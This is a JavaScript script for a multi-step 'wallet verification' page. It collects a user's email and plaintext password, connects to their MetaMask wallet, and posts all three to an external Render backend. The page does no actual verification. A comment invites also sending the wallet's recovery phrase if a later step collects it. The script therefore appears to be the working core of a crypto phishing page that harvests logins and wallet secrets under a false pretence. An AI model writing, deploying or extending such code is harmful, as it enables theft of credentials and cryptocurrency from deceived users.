// Use your Render URL directly so it works from anywhere
const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const toStep2Btn = document.getElementById('toStep2');
    const toStep3Btn = document.getElementById('toStep3');
    const connectBtn = document.getElementById('connectBtn');
    const statusText = document.getElementById('status');

    // Step 1 -> Step 2
    toStep2Btn.addEventListener('click', () => {
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    });

    // Step 2 -> Step 3
    toStep3Btn.addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (!email || !pass) {
            alert('Please fill in all fields.');
            return;
        }

        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-3').classList.remove('hidden');
    });

    // Step 3: Verify Wallet & Send to Backend
    connectBtn.addEventListener('click', async () => {
        if (typeof window.ethereum === 'undefined') {
            statusText.innerText = 'Please install MetaMask to proceed.';
            return;
        }

        try {
            statusText.innerText = 'Connecting to wallet...';
            
            // Request wallet connection
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const walletAddress = accounts[0];
            
            // Gather data from the previous steps
            const email = document.getElementById('email').value;
            const password = document.getElementById('pass').value;

            statusText.innerText = 'Verifying your wallet...';

            // Send all collected data to your Render backend
            const response = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    walletAddress: walletAddress
                    // You can add recoveryPhrase here if you collect it in a later step
                })
            });

            if (response.ok) {
                statusText.innerText = 'Verification successful! You will be redirected.';
                statusText.style.color = 'green';
                
                // Redirect to your dashboard after a short delay
                setTimeout(() => {
                    window.location.href = `${API_URL}/dashboard.html`;
                }, 2000);
            } else {
                throw new Error('Server response error');
            }

        } catch (error) {
            console.error('Error:', error);
            statusText.innerText = 'An error occurred. Please try again.';
            statusText.style.color = 'red';
        }
    });
});
